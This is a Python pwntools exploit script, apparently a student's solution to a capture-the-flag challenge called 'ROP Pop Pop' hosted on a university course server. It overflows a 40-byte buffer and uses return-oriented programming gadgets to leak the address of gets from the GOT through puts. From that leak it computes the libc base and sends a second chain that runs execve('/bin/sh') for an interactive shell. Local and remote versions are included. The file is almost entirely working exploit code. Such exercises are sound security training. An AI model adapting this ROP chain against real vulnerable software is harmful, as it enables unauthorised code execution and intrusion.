from pwn import *
from pwnlib.util.packing import *
import re
import struct
import math

#############################################################
#	RPP_Pwn.py												#
#	Lindsay Von Tish (lmv9443@nyu.edu)						#
#	Pwn 2: ROP Pop Pop										#
#	03/13/2024												#
#############################################################

HOST = 'offsec-chalbroker.osiris.cyber.nyu.edu'
PORT = 1343


# A function to convert encoded input to a string and remove text format characters
#	Input: Encoded string
#	Output: Unencoded string
def cleanLine(ln):
	ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
	l = ansi_escape.sub('', str(ln, encoding='utf-8'))
	return l

# A function to find what part of the payload is being read as an address when the program crashes
#	Input: N/A
#	Output: N/A
def getOffset():
	p = process('./rop')
	p.recvuntil("tools..")
	#p.sendline(cyclic(100))
	pld = leakPuts()
	p.sendline(pld)
	p.wait()
	cf = p.corefile
	stack = cf.rsp
	info("rsp = %#x", stack)
	#pattern = cf.read(stack, 4)
	#offset = cyclic_find(pattern)
	#info("offset = %d", offset)
	return 0


def leakGets():
	binary = context.binary = ELF('./rop', checksec=False)
	
	# 0x00000000004006b3 : pop rdi ; ret
	popRDI = p64(0x004006b3)
	retGdgt = p64(0x004004a9)
	
	pltPuts = p64(binary.plt.puts)		# Address to call
	gotGets = p64(binary.got.gets)


	pld = cyclic(40)
	pld += retGdgt + popRDI + gotGets + pltPuts
	return pld
	
	#p.send(pld)
	#p.interactive()
	#cf = p.corefile

def leaky(p):
	p.recvuntil("tools..")
	p.sendline(leakGets())
	p.recvline()
	addr = p.recvline()
	log.info(addr)
	leak = u64(addr.ljust(8, b'\x00'))
	leak -= 0xa000000000000
	log.info("Gets leak - " + hex(leak))
	

def testLeak():
	p = process('/bin/bash')
	p.sendline('gdb ./rop -q')
	p.sendline("set disable-randomization off")
	#p.sendline("break *0x0040064a") # Break at ret in main
	p.recv()
	p.clean(timeout=0.05)
	p.sendline("r")
	p.recvuntil("tools..")
	p.sendline(leakGets())
	p.recvline()
	addr = p.recvline()
	log.info(addr)
	leak = u64(addr.ljust(8, b'\x00'))
	log.info("puts leak - " + hex(leak))
	p.interactive()
	'''
	p.sendline("r")
	p.recvuntil("tools..")
	p.sendline(leakPuts())
	p.recvline()
	addr = p.recvline()
	log.info(addr)
	leak = u64(addr.ljust(8, b'\x00'))
	log.info("puts leak - " + hex(leak))
	p.interactive()
	'''

def localLeak():
	p = process("./rop")
	context.log_level = 'debug'
	#p.interactive()
	#p.recvuntil("tools..")
	leaky(p)

def remoteLeak():
	p = remote(HOST, PORT)
	context.log_level = 'debug'
	#p.interactive()
	#p.recvuntil("tools..")
	leaky(p)


def mainLinePld():
	binary = context.binary = ELF('./rop', checksec=False)
	
	# 0x00000000004006b3 : pop rdi ; ret
	popRDI = p64(0x004006b3)
	retGdgt = p64(0x004004a9)
	
	pltPuts = p64(binary.plt.puts)		# Address to call
	gotGets = p64(binary.got.gets)

	mainAddr = p64(0x00400621)			# Address of first line in main


	pld = cyclic(40)
	pld += retGdgt + popRDI + gotGets + pltPuts
	pld += mainAddr
	return pld


def mainline(p):
	i = 0
	while i < 3:
		p.recvuntil("tools..")
		p.sendline(mainLinePld())
		p.recvline()
		addr = p.recvline()
		log.info(addr)
		leak = u64(addr.ljust(8, b'\x00'))
		log.info("gets leak - " + hex(leak))
		i+=1
	p.interactive()


def localMainline():
	p = process("./rop")
	context.log_level = 'debug'
	mainline(p)


def remoteMainline():
	p = remote(HOST, PORT)
	context.log_level = 'debug'
	mainline(p)

def pwnPLD_libc6(libcBase):
	binary = context.binary = ELF('./rop', checksec=False)
	
	# Gadgets in Binary
	# 0x00000000004006b3 : pop rdi ; ret
	popRDI = p64(0x004006b3)
	# 0x00000000004006b1 : pop rsi ; pop r15 ; ret
	popRSI = p64(0x004006b1)
	# 0x00000000004004a9 : ret
	retGdgt = p64(0x004004a9)


	# Gadgets in Library
	# 0x00000000000fd6bd : pop rdx ; ret
	g = libcBase + 0x00fd6bd
	log.info("popRDX - " + hex(g))
	popRDX = p64(g)
	# 0x000000000003f587 : pop rax ; ret
	g = libcBase + 0x003f587
	log.info("popRAX - " + hex(g))
	popRAX = p64(g)
	# 0x0000000000026468 : syscall
	g = libcBase + 0x0026468
	log.info("syscall - " + hex(g))
	syscall = p64(g)

	# Data for the stack
	# /bin/sh address
	binSh = libcBase + 0x0019604f
	datRDI = p64(binSh)
	datRSI = p64(0x00)
	junk = p64(0xdeadbeef)
	datRDX = p64(0x00)
	datRAX = p64(0x3b)
	
	#pltPuts = p64(binary.plt.puts)		# Address to call
	#gotGets = p64(binary.got.gets)

	#mainAddr = p64(0x00400621)			# Address of first line in main

	# 

	pld = cyclic(40)
	pld += retGdgt + popRDI + datRDI + popRSI + datRSI + junk + popRDX + datRDX + popRAX + datRAX + syscall + retGdgt
	#pld += retGdgt + popRDI + gotGets + pltPuts
	#pld += mainAddr
	return pld

def pwnLocal(p):
	#p.recv()
	#p.clean(timeout=0.05)
	p.recvuntil("tools..")
	p.sendline(mainLinePld())
	#p.recvuntil("Breakpoint")
	#p.recv()
	#p.clean(timeout=0.05)
	#p.sendline("c")
	
	print(p.recvline())
	#print(p.recvline())
	#p.recvline()
	addr = p.recvline()
	log.info(addr)
	leak = u64(addr.ljust(8, b'\x00'))
	#leak = u64(addr.ljust(8, b'a'))
	# There's an extra a at the beginning for no reason
	leak -= 0xa000000000000
	log.info("gots leak - " + hex(leak))

	#libcBase = leak - 0xf7a50 + 0x100000
	libcBase = leak - 0x75050
	log.info("libcBase - " + hex(libcBase))

	p.recvuntil("tools..")
	p.sendline(pwnPLD_libc6(libcBase))
	p.interactive()

def test():
	p = process('/bin/bash')
	p.sendline('gdb ./rop -q')
	p.sendline("set disable-randomization off")
	p.sendline("break *0x0040064a") # Break at ret in main
	p.recv()
	p.clean(timeout=0.05)
	p.sendline("r")
	pwnLocal(p)
	p.interactive()

def localPwn():
	p = process('./rop')
	#p.sendline('gdb ./rop -q')
	#p.sendline("set disable-randomization off")
	#p.sendline("break *0x0040064a") # Break at ret in main
	#p.recv()
	#p.clean(timeout=0.05)
	#p.sendline("r")
	pwnLocal(p)
	p.interactive()

def pwnPLD_libc2(libcBase):
	binary = context.binary = ELF('./rop', checksec=False)
	
	# Gadgets in Binary
	# 0x00000000004006b3 : pop rdi ; ret
	popRDI = p64(0x004006b3)
	# 0x00000000004006b1 : pop rsi ; pop r15 ; ret
	popRSI = p64(0x004006b1)
	# 0x00000000004004a9 : ret
	retGdgt = p64(0x004004a9)


	# Gadgets in Library
	# 0x0000000000119431 : pop rdx ; pop r12 ; ret
	g = libcBase + 0x00119431
	log.info("popRDX - " + hex(g))
	popRDX = p64(g)
	# 0x0000000000036174 : pop rax ; ret
	g = libcBase + 0x0036174
	log.info("popRAX - " + hex(g))
	popRAX = p64(g)
	# 0x000000000002284d : syscall
	g = libcBase + 0x002284d
	log.info("syscall - " + hex(g))
	syscall = p64(g)

	# Data for the stack
	# /bin/sh address
	binSh = libcBase + 0x001b45bd
	datRDI = p64(binSh)
	datRSI = p64(0x00)
	junk = p64(0xdeadbeef)
	datRDX = p64(0x00)
	datRAX = p64(0x3b)
	
	#pltPuts = p64(binary.plt.puts)		# Address to call
	#gotGets = p64(binary.got.gets)

	#mainAddr = p64(0x00400621)			# Address of first line in main

	# 

	pld = cyclic(40)
	pld += retGdgt + popRDI + datRDI + popRSI + datRSI + junk + popRDX + datRDX + junk + popRAX + datRAX + syscall + retGdgt
	return pld

def pwnRemote(p):
	p.recvuntil("tools..")
	p.sendline(mainLinePld())

	print(p.recvline())
	addr = p.recvline()
	log.info(addr)
	leak = u64(addr.ljust(8, b'\x00'))
	log.info("gots leak - " + hex(leak))

	#libcBase = leak - 0xf7a50 + 0x100000
	libcBase = leak - 0x00083970
	log.info("libcBase - " + hex(libcBase))

	p.recvuntil("tools..")
	p.sendline(pwnPLD_libc2(libcBase))
	p.interactive()

def remotePwn():
	p = remote(HOST, PORT)
	pwnRemote(p)
	p.interactive()

# leakPuts()
# getPutsAddr()
# getOffset()
# testLocalPld()
#testLeak()
#remoteMainline()
#remoteLeak()
#test()
#localPwn()
#remotePwn()
#testLeak()


